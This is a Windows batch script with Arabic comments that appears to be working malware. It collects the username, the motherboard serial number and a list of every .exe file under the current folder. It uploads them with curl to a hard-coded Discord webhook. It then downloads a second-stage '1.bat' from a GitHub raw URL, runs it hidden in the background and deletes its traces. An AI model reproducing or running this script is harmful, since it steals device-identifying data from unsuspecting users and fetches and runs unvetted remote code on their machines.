@echo off
:: إعداد الروابط
set "WEBHOOK_URL=https://discord.com/api/webhooks/1461350525168652433/y5T90DbXCLHZGb_wqEi9ho4VqMb1XGgA6VKoL_M9LbKiywFyhcl4bAE7MpZF2oiTFOyB"
set "BAT1_URL=https://raw.githubusercontent.com/857seif/11111111/main/1.bat"
set "TEMP_FILE=%TEMP%\Result.txt"
set "BAT1_PATH=%TEMP%\1.bat"

:: 1. جمع معلومات الجهاز والملفات
echo === Device Info === > "%TEMP_FILE%"
echo Username: %USERNAME% >> "%TEMP_FILE%"
echo Motherboard ID: >> "%TEMP_FILE%"
wmic baseboard get serialnumber | findstr /V "SerialNumber" >> "%TEMP_FILE%"
echo. >> "%TEMP_FILE%"
echo === Folder Contents (EXE) === >> "%TEMP_FILE%"
dir /b /s *.exe >> "%TEMP_FILE%"

:: 2. إرسال البيانات إلى Discord
curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%TEMP_FILE%" %WEBHOOK_URL%

:: 3. تحميل ملف المرحلة الثانية (1.bat) وتشغيله في الخلفية
curl -L -o "%BAT1_PATH%" %BAT1_URL%
start /b "" cmd /c "%BAT1_PATH%"

:: 4. مسح ملف النتائج المؤقت والخروج
if exist "%TEMP_FILE%" del /f /q "%TEMP_FILE%"
exit
